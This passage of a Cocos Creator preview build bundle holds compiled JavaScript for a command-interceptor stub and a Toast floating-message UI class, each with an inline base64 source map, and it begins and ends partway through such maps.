fCAxKTtcclxuICB9XHJcblxyXG5cclxuICAvLyBDb21wYXJlIHRoZSB2YWx1ZSBvZiBCaWdOdW1iZXJzIHggYW5kIHkuXHJcbiAgZnVuY3Rpb24gY29tcGFyZSh4LCB5KSB7XHJcbiAgICB2YXIgYSwgYixcclxuICAgICAgeGMgPSB4LmMsXHJcbiAgICAgIHljID0geS5jLFxyXG4gICAgICBpID0geC5zLFxyXG4gICAgICBqID0geS5zLFxyXG4gICAgICBrID0geC5lLFxyXG4gICAgICBsID0geS5lO1xyXG5cclxuICAgIC8vIEVpdGhlciBOYU4/XHJcbiAgICBpZiAoIWkgfHwgIWopIHJldHVybiBudWxsO1xyXG5cclxuICAgIGEgPSB4YyAmJiAheGNbMF07XHJcbiAgICBiID0geWMgJiYgIXljWzBdO1xyXG5cclxuICAgIC8vIEVpdGhlciB6ZXJvP1xyXG4gICAgaWYgKGEgfHwgYikgcmV0dXJuIGEgPyBiID8gMCA6IC1qIDogaTtcclxuXHJcbiAgICAvLyBTaWducyBkaWZmZXI/XHJcbiAgICBpZiAoaSAhPSBqKSByZXR1cm4gaTtcclxuXHJcbiAgICBhID0gaSA8IDA7XHJcbiAgICBiID0gayA9PSBsO1xyXG5cclxuICAgIC8vIEVpdGhlciBJbmZpbml0eT9cclxuICAgIGlmICgheGMgfHwgIXljKSByZXR1cm4gYiA/IDAgOiAheGMgXiBhID8gMSA6IC0xO1xyXG5cclxuICAgIC8vIENvbXBhcmUgZXhwb25lbnRzLlxyXG4gICAgaWYgKCFiKSByZXR1cm4gayA+IGwgXiBhID8gMSA6IC0xO1xyXG5cclxuICAgIGogPSAoayA9IHhjLmxlbmd0aCkgPCAobCA9IHljLmxlbmd0aCkgPyBrIDogbDtcclxuXHJcbiAgICAvLyBDb21wYXJlIGRpZ2l0IGJ5IGRpZ2l0LlxyXG4gICAgZm9yIChpID0gMDsgaSA8IGo7IGkrKykgaWYgKHhjW2ldICE9IHljW2ldKSByZXR1cm4geGNbaV0gPiB5Y1tpXSBeIGEgPyAxIDogLTE7XHJcblxyXG4gICAgLy8gQ29tcGFyZSBsZW5ndGhzLlxyXG4gICAgcmV0dXJuIGsgPT0gbCA/IDAgOiBrID4gbCBeIGEgPyAxIDogLTE7XHJcbiAgfVxyXG5cclxuXHJcbiAgLypcclxuICAgKiBDaGVjayB0aGF0IG4gaXMgYSBwcmltaXRpdmUgbnVtYmVyLCBhbiBpbnRlZ2VyLCBhbmQgaW4gcmFuZ2UsIG90aGVyd2lzZSB0aHJvdy5cclxuICAgKi9cclxuICBmdW5jdGlvbiBpbnRDaGVjayhuLCBtaW4sIG1heCwgbmFtZSkge1xyXG4gICAgaWYgKG4gPCBtaW4gfHwgbiA+IG1heCB8fCBuICE9PSAobiA8IDAgPyBtYXRoY2VpbChuKSA6IG1hdGhmbG9vcihuKSkpIHtcclxuICAgICAgdGhyb3cgRXJyb3JcclxuICAgICAgIChiaWdudW1iZXJFcnJvciArIChuYW1lIHx8ICdBcmd1bWVudCcpICsgKHR5cGVvZiBuID09ICdudW1iZXInXHJcbiAgICAgICAgID8gbiA8IG1pbiB8fCBuID4gbWF4ID8gJyBvdXQgb2YgcmFuZ2U6ICcgOiAnIG5vdCBhbiBpbnRlZ2VyOiAnXHJcbiAgICAgICAgIDogJyBub3QgYSBwcmltaXRpdmUgbnVtYmVyOiAnKSArIG4pO1xyXG4gICAgfVxyXG4gIH1cclxuXHJcblxyXG4gIGZ1bmN0aW9uIGlzQXJyYXkob2JqKSB7XHJcbiAgICByZXR1cm4gT2JqZWN0LnByb3RvdHlwZS50b1N0cmluZy5jYWxsKG9iaikgPT0gJ1tvYmplY3QgQXJyYXldJztcclxuICB9XHJcblxyXG5cclxuICAvLyBBc3N1bWVzIGZpbml0ZSBuLlxyXG4gIGZ1bmN0aW9uIGlzT2RkKG4pIHtcclxuICAgIHZhciBrID0gbi5jLmxlbmd0aCAtIDE7XHJcbiAgICByZXR1cm4gYml0Rmxvb3Iobi5lIC8gTE9HX0JBU0UpID09IGsgJiYgbi5jW2tdICUgMiAhPSAwO1xyXG4gIH1cclxuXHJcblxyXG4gIGZ1bmN0aW9uIHRvRXhwb25lbnRpYWwoc3RyLCBlKSB7XHJcbiAgICByZXR1cm4gKHN0ci5sZW5ndGggPiAxID8gc3RyLmNoYXJBdCgwKSArICcuJyArIHN0ci5zbGljZSgxKSA6IHN0cikgK1xyXG4gICAgIChlIDwgMCA/ICdlJyA6ICdlKycpICsgZTtcclxuICB9XHJcblxyXG5cclxuICBmdW5jdGlvbiB0b0ZpeGVkUG9pbnQoc3RyLCBlLCB6KSB7XHJcbiAgICB2YXIgbGVuLCB6cztcclxuXHJcbiAgICAvLyBOZWdhdGl2ZSBleHBvbmVudD9cclxuICAgIGlmIChlIDwgMCkge1xyXG5cclxuICAgICAgLy8gUHJlcGVuZCB6ZXJvcy5cclxuICAgICAgZm9yICh6cyA9IHogKyAnLic7ICsrZTsgenMgKz0geik7XHJcbiAgICAgIHN0ciA9IHpzICsgc3RyO1xyXG5cclxuICAgIC8vIFBvc2l0aXZlIGV4cG9uZW50XHJcbiAgICB9IGVsc2Uge1xyXG4gICAgICBsZW4gPSBzdHIubGVuZ3RoO1xyXG5cclxuICAgICAgLy8gQXBwZW5kIHplcm9zLlxyXG4gICAgICBpZiAoKytlID4gbGVuKSB7XHJcbiAgICAgICAgZm9yICh6cyA9IHosIGUgLT0gbGVuOyAtLWU7IHpzICs9IHopO1xyXG4gICAgICAgIHN0ciArPSB6cztcclxuICAgICAgfSBlbHNlIGlmIChlIDwgbGVuKSB7XHJcbiAgICAgICAgc3RyID0gc3RyLnNsaWNlKDAsIGUpICsgJy4nICsgc3RyLnNsaWNlKGUpO1xyXG4gICAgICB9XHJcbiAgICB9XHJcblxyXG4gICAgcmV0dXJuIHN0cjtcclxuICB9XHJcblxyXG5cclxuICAvLyBFWFBPUlRcclxuXHJcblxyXG4gIEJpZ051bWJlciA9IGNsb25lKCk7XHJcbiAgQmlnTnVtYmVyWydkZWZhdWx0J10gPSBCaWdOdW1iZXIuQmlnTnVtYmVyID0gQmlnTnVtYmVyO1xyXG5cclxuICAvLyBBTUQuXHJcbiAgaWYgKHR5cGVvZiBkZWZpbmUgPT0gJ2Z1bmN0aW9uJyAmJiBkZWZpbmUuYW1kKSB7XHJcbiAgICBkZWZpbmUoZnVuY3Rpb24gKCkgeyByZXR1cm4gQmlnTnVtYmVyOyB9KTtcclxuXHJcbiAgLy8gTm9kZS5qcyBhbmQgb3RoZXIgZW52aXJvbm1lbnRzIHRoYXQgc3VwcG9ydCBtb2R1bGUuZXhwb3J0cy5cclxuICB9IGVsc2UgaWYgKHR5cGVvZiBtb2R1bGUgIT0gJ3VuZGVmaW5lZCcgJiYgbW9kdWxlLmV4cG9ydHMpIHtcclxuICAgIG1vZHVsZS5leHBvcnRzID0gQmlnTnVtYmVyO1xyXG5cclxuICAvLyBCcm93c2VyLlxyXG4gIH0gZWxzZSB7XHJcbiAgICBpZiAoIWdsb2JhbE9iamVjdCkge1xyXG4gICAgICBnbG9iYWxPYmplY3QgPSB0eXBlb2Ygc2VsZiAhPSAndW5kZWZpbmVkJyAmJiBzZWxmID8gc2VsZiA6IHdpbmRvdztcclxuICAgIH1cclxuXHJcbiAgICBnbG9iYWxPYmplY3QuQmlnTnVtYmVyID0gQmlnTnVtYmVyO1xyXG4gIH1cclxufSkodGhpcyk7Il19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/interceptor/PostCommandInterceptor.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'b1980TfB1xNpaZmm/jO2HzX', 'PostCommandInterceptor');
// framework/interceptor/PostCommandInterceptor.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
exports.PostCommandInterceptor = void 0;
var PostCommandInterceptor = /** @class */ (function () {
    function PostCommandInterceptor() {
    }
    PostCommandInterceptor.prototype.preHandle = function () {
        var args = [];
        for (var _i = 0; _i < arguments.length; _i++) {
            args[_i] = arguments[_i];
        }
        return __awaiter(this, void 0, Promise, function () {
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve) { return resolve(true); })];
            });
        });
    };
    return PostCommandInterceptor;
}());
exports.PostCommandInterceptor = PostCommandInterceptor;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvaW50ZXJjZXB0b3IvUG9zdENvbW1hbmRJbnRlcmNlcHRvci50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7QUFBQSxvQkFBb0I7QUFDcEIsaUZBQWlGO0FBQ2pGLHlGQUF5RjtBQUN6RixtQkFBbUI7QUFDbkIsMkZBQTJGO0FBQzNGLG1HQUFtRztBQUNuRyw4QkFBOEI7QUFDOUIsMkZBQTJGO0FBQzNGLG1HQUFtRzs7O0FBSW5HO0lBQUE7SUFPQSxDQUFDO0lBTFUsMENBQVMsR0FBaEI7UUFBaUIsY0FBTzthQUFQLFVBQU8sRUFBUCxxQkFBTyxFQUFQLElBQU87WUFBUCx5QkFBTzs7dUNBQUUsT0FBTzs7Z0JBQzdCLHNCQUFPLElBQUksT0FBTyxDQUFVLFVBQUEsT0FBTyxJQUFJLE9BQUEsT0FBTyxDQUFDLElBQUksQ0FBQyxFQUFiLENBQWEsQ0FBQyxFQUFDOzs7S0FDekQ7SUFHTCw2QkFBQztBQUFELENBUEEsQUFPQyxJQUFBO0FBUHFCLHdEQUFzQiIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIi8vIExlYXJuIFR5cGVTY3JpcHQ6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL3R5cGVzY3JpcHQuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL3R5cGVzY3JpcHQuaHRtbFxyXG4vLyBMZWFybiBBdHRyaWJ1dGU6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL3JlZmVyZW5jZS9hdHRyaWJ1dGVzLmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy9yZWZlcmVuY2UvYXR0cmlidXRlcy5odG1sXHJcbi8vIExlYXJuIGxpZmUtY3ljbGUgY2FsbGJhY2tzOlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy9saWZlLWN5Y2xlLWNhbGxiYWNrcy5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvbGlmZS1jeWNsZS1jYWxsYmFja3MuaHRtbFxyXG5cclxuaW1wb3J0IHtJQ29tbWFuZEludGVyY2VwdG9yfSBmcm9tIFwiLi9Db21tYW5kSW50ZXJjZXB0b3JcIjtcclxuXHJcbmV4cG9ydCBhYnN0cmFjdCBjbGFzcyBQb3N0Q29tbWFuZEludGVyY2VwdG9yIGltcGxlbWVudHMgSUNvbW1hbmRJbnRlcmNlcHRvciB7XHJcblxyXG4gICAgYXN5bmMgIHByZUhhbmRsZSguLi5hcmdzKTpQcm9taXNlPGJvb2xlYW4+e1xyXG4gICAgICAgIHJldHVybiBuZXcgUHJvbWlzZTxib29sZWFuPihyZXNvbHZlID0+IHJlc29sdmUodHJ1ZSkpO1xyXG4gICAgfVxyXG5cclxuICAgIGFic3RyYWN0IGFzeW5jIHBvc3RIYW5kbGUocmVzOmFueSwgLi4uYXJncyk6UHJvbWlzZTtcclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/extend/Toast.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '909590vl5dAK5p6FmzQ2dSn', 'Toast');
// framework/extend/Toast.ts

Object.defineProperty(exports, "__esModule", { value: true });
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var Toast = /** @class */ (function () {
    function Toast() {
    }
    /** 飘动显示效果(适合显示label提示，类似toast) */
    Toast.flutterAction = function () {
        var moveSeq = cc.sequence([
            cc.moveBy(0.6, cc.v2(0, 0)),
            cc.moveBy(1, cc.v2(0, 84))
        ]);
        var scaleSeq = cc.sequence([
            cc.scaleTo(0.1, 1.2),
            cc.scaleTo(0.1, 0.8),
            cc.scaleTo(0.1, 1),
        ]);
        var alphaSeq = cc.sequence([
            cc.fadeTo(0.8, 255),
            cc.fadeTo(0.8, 0),
        ]);
        var spawn = cc.spawn(moveSeq, alphaSeq);
        return spawn;
    };
    Toast.createRichText = function (config) {
        var name = "OnlyOneToastNode";
        var node = cc.director.getScene().getChildByName(name);
        if (!node) {
            node = new cc.Node(name);
            cc.director.getScene().addChild(node, 100);
        }
        node.scale = 1;
        node.rotation = 0;
        node.opacity = 255;
        node.group = config.group || "ui";
        node.x = config.x || cc.visibleRect.center.x;
        node.y = config.y || cc.visibleRect.center.y;
        var sprite = node.addComponent(cc.Sprite);
        sprite.type = cc.Sprite.Type.SLICED;
        sprite.sizeMode = cc.Sprite.SizeMode.CUSTOM;
        sprite.spriteFrame = cc.loader.getRes("frame_fy005", cc.SpriteFrame);
        var richTextNode = node.getChildByName("RichTextNode");
        if (!richTextNode) {
            richTextNode = new cc.Node("RichTextNode");
            node.addChild(richTextNode);
            richTextNode.addComponent(cc.RichText);
        }
        var richText = richTextNode.getComponent(cc.RichText);
        richText.fontSize = config.fontSize || 38;
        richText.string = config.string;
        richText.lineHeight = richText.fontSize + 10;
        node.setContentSize(richText.node.width + 30, richText.node.height + 20);
        return node;
    };
    Toast.flutter = function (config) {
        var node = this.createRichText(config);
        node.stopAllActions();
        node.runAction(cc.sequence(cc.delayTime(0.6), this.flutterAction(), cc.callFunc(function () { return node.destroy(); })));
    };
    Toast.fadeOut = function (config) {
        var node = this.createRichText(config);
        node.stopAllActions();
        node.runAction(cc.sequence(cc.delayTime(0.8), cc.fadeTo(2, 80), cc.callFunc(function () { return node.destroy(); })));
    };
    Toast = __decorate([
        ccclass
    ], Toast);
    return Toast;
}());
exports.default = Toast;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvZXh0ZW5kL1RvYXN0LnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFDTSxJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQVcxQztJQUFBO0lBb0VBLENBQUM7SUFsRUcsa0NBQWtDO0lBQ25CLG1CQUFhLEdBQTVCO1FBQ0ksSUFBSSxPQUFPLEdBQUcsRUFBRSxDQUFDLFFBQVEsQ0FBQztZQUN0QixFQUFFLENBQUMsTUFBTSxDQUFDLEdBQUcsRUFBRSxFQUFFLENBQUMsRUFBRSxDQUFDLENBQUMsRUFBRSxDQUFDLENBQUMsQ0FBQztZQUMzQixFQUFFLENBQUMsTUFBTSxDQUFDLENBQUMsRUFBRSxFQUFFLENBQUMsRUFBRSxDQUFDLENBQUMsRUFBRSxFQUFFLENBQUMsQ0FBQztTQUM3QixDQUFDLENBQUM7UUFFSCxJQUFJLFFBQVEsR0FBRyxFQUFFLENBQUMsUUFBUSxDQUFDO1lBQ3ZCLEVBQUUsQ0FBQyxPQUFPLENBQUMsR0FBRyxFQUFFLEdBQUcsQ0FBQztZQUNwQixFQUFFLENBQUMsT0FBTyxDQUFDLEdBQUcsRUFBRSxHQUFHLENBQUM7WUFDcEIsRUFBRSxDQUFDLE9BQU8sQ0FBQyxHQUFHLEVBQUUsQ0FBQyxDQUFDO1NBQ3JCLENBQUMsQ0FBQztRQUVILElBQUksUUFBUSxHQUFHLEVBQUUsQ0FBQyxRQUFRLENBQUM7WUFDdkIsRUFBRSxDQUFDLE1BQU0sQ0FBQyxHQUFHLEVBQUUsR0FBRyxDQUFDO1lBQ25CLEVBQUUsQ0FBQyxNQUFNLENBQUMsR0FBRyxFQUFFLENBQUMsQ0FBQztTQUNwQixDQUFDLENBQUM7UUFFSCxJQUFJLEtBQUssR0FBRyxFQUFFLENBQUMsS0FBSyxDQUFDLE9BQU8sRUFBRSxRQUFRLENBQUMsQ0FBQztRQUN4QyxPQUFPLEtBQUssQ0FBQztJQUNqQixDQUFDO0lBRWMsb0JBQWMsR0FBN0IsVUFBOEIs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QUMsQ0FBQztJQUMxRyxDQUFDO0lBRWEsYUFBTyxHQUFyQixVQUFzQixNQUFrQjtRQUNwQyxJQUFJLElBQUksR0FBRyxJQUFJLENBQUMsY0FBYyxDQUFDLE1BQU0sQ0FBQyxDQUFDO1FBQ3ZDLElBQUksQ0FBQyxjQUFjLEVBQUUsQ0FBQztRQUN0QixJQUFJLENBQUMsU0FBUyxDQUFDLEVBQUUsQ0FBQyxRQUFRLENBQUMsRUFBRSxDQUFDLFNBQVMsQ0FBQyxHQUFHLENBQUMsRUFBRSxFQUFFLENBQUMsTUFBTSxDQUFDLENBQUMsRUFBRSxFQUFFLENBQUMsRUFBRSxFQUFFLENBQUMsUUFBUSxDQUFDLGNBQUksT0FBQSxJQUFJLENBQUMsT0FBTyxFQUFFLEVBQWQsQ0FBYyxDQUFDLENBQUMsQ0FBQyxDQUFDO0lBQ3RHLENBQUM7SUFuRWdCLEtBQUs7UUFEekIsT0FBTztPQUNhLEtBQUssQ0FvRXpCO0lBQUQsWUFBQztDQXBFRCxBQW9FQyxJQUFBO2tCQXBFb0IsS0FBSyIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHl9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbmludGVyZmFjZSBUb2FzdENvbmZpZyB7XHJcbiAgICB4PzpudW1iZXI7XHJcbiAgICB5PzpudW1iZXI7XHJcbiAgICBmb250U2l6ZT86bnVtYmVyO1xyXG4gICAgc3RyaW5nOnN0cmluZztcclxuICAgIGdyb3VwPzpzdHJpbmc7XHJcbn1cclxuXHJcbkBjY2NsYXNzXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIFRvYXN0IHtcclxuXHJcbiAgICAvKiog6aOY5Yqo5pi+56S65pWI5p6cKOmAguWQiOaYvuekumxhYmVs5o+Q56S677yM57G75Ly8dG9hc3QpICovXHJcbiAgICBwcml2YXRlIHN0YXRpYyBmbHV0dGVyQWN0aW9uKCk6IGNjLkZpbml0ZVRpbWVBY3Rpb24ge1xyXG4gICAgICAgIGxldCBtb3ZlU2VxID0gY2Muc2VxdWVuY2UoW1xyXG4gICAgICAgICAgICBjYy5tb3ZlQnkoMC42LCBjYy52MigwLCAwKSksXHJcbiAgICAgICAgICAgIGNjLm1vdmVCeSgxLCBjYy52MigwLCA4NCkpXHJcbiAgICAgICAgXSk7XHJcblxyXG4gICAgICAgIGxldCBzY2FsZVNlcSA9IGNjLnNlcXVlbmNlKFtcclxuICAgICAgICAgICAgY2Muc2NhbGVUbygwLjEsIDEuMiksXHJcbiAgICAgICAgICAgIGNjLnNjYWxlVG8oMC4xLCAwLjgpLFxyXG4gICAgICAgICAgICBjYy5zY2FsZVRvKDAuMSwgMSksXHJcbiAgICAgICAgXSk7XHJcblxyXG4gICAgICAgIGxldCBhbHBoYVNlcSA9IGNjLnNlcXVlbmNlKFtcclxuICAgICAgICAgICAgY2MuZmFkZVRvKDAuOCwgMjU1KSxcclxuICAgICAgICAgICAgY2MuZmFkZVRvKDAuOCwgMCksXHJcbiAgICAgICAgXSk7XHJcblxyXG4gICAgICAgIGxldCBzcGF3biA9IGNjLnNwYXduKG1vdmVTZXEsIGFscGhhU2VxKTtcclxuICAgICAgICByZXR1cm4gc3Bhd247XHJcbiAgICB9XHJcblxyXG4gICAgcHJpdmF0ZSBzdGF0aWMgY3JlYXRlUmljaFRleHQoY29uZmlnOlRvYXN0Q29uZmlnKXtcclxuICAgICAgICBsZXQgbmFtZSA9IFwiT25seU9uZVRvYXN0Tm9kZVwiO1xyXG4gICAgICAgIGxldCBub2RlID0gY2MuZGlyZWN0b3IuZ2V0U2NlbmUoKS5nZXRDaGlsZEJ5TmFtZShuYW1lKTtcclxuICAgICAgICBpZiAoIW5vZGUpe1xyXG4gICAgICAgICAgICBub2RlID0gbmV3IGNjLk5vZGUobmFtZSk7XHJcbiAgICAgICAgICAgIGNjLmRpcmVjdG9yLmdldFNjZW5lKCkuYWRkQ2hpbGQobm9kZSwgMTAwKTtcclxuICAgICAgICB9XHJcbiAgICAgICAgbm9kZS5zY2FsZSA9IDE7XHJcbiAgICAgICAgbm9kZS5yb3RhdGlvbiA9IDA7XHJcbiAgICAgICAgbm9kZS5vcGFjaXR5ID0gMjU1O1xyXG4gICAgICAgIG5vZGUuZ3JvdXAgPSBjb25maWcuZ3JvdXAgfHwgXCJ1aVwiO1xyXG4gICAgICAgIG5vZGUueCAgPSBjb25maWcueCB8fCBjYy52aXNpYmxlUmVjdC5jZW50ZXIueDtcclxuICAgICAgICBub2RlLnkgPSBjb25maWcueSB8fCBjYy52aXNpYmxlUmVjdC5jZW50ZXIueTtcclxuICAgICAgICBsZXQgc3ByaXRlID0gbm9kZS5hZGRDb21wb25lbnQoY2MuU3ByaXRlKTtcclxuICAgICAgICBzcHJpdGUudHlwZSA9IGNjLlNwcml0ZS5UeXBlLlNMSUNFRDtcclxuICAgICAgICBzcHJpdGUuc2l6ZU1vZGUgPSBjYy5TcHJpdGUuU2l6ZU1vZGUuQ1VTVE9NO1xyXG4gICAgICAgIHNwcml0ZS5zcHJpdGVGcmFtZSA9IGNjLmxvYWRlci5nZXRSZXMoXCJmcmFtZV9meTAwNVwiLCBjYy5TcHJpdGVGcmFtZSk7XHJcblxyXG4gICAgICAgIGxldCByaWNoVGV4dE5vZGUgPSBub2RlLmdldENoaWxkQnlOYW1lKFwiUmljaFRleHROb2RlXCIpO1xyXG4gICAgICAgIGlmICghcmljaFRleHROb2RlKXtcclxuICAgICAgICAgICAgcmljaFRleHROb2RlID0gbmV3IGNjLk5vZGUoXCJSaWNoVGV4dE5vZGVcIik7XHJcbiAgICAgICAgICAgIG5vZGUuYWRkQ2hpbGQocmljaFRleHROb2RlKTtcclxuICAgICAgICAgICAgcmljaFRleHROb2RlLmFkZENvbXBvbmVudChjYy5SaWNoVGV4dCk7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIGxldCByaWNoVGV4dCA9IHJpY2hUZXh0Tm9kZS5nZXRDb21wb25lbnQoY2MuUmljaFRleHQpO1xyXG4gICAgICAgIHJ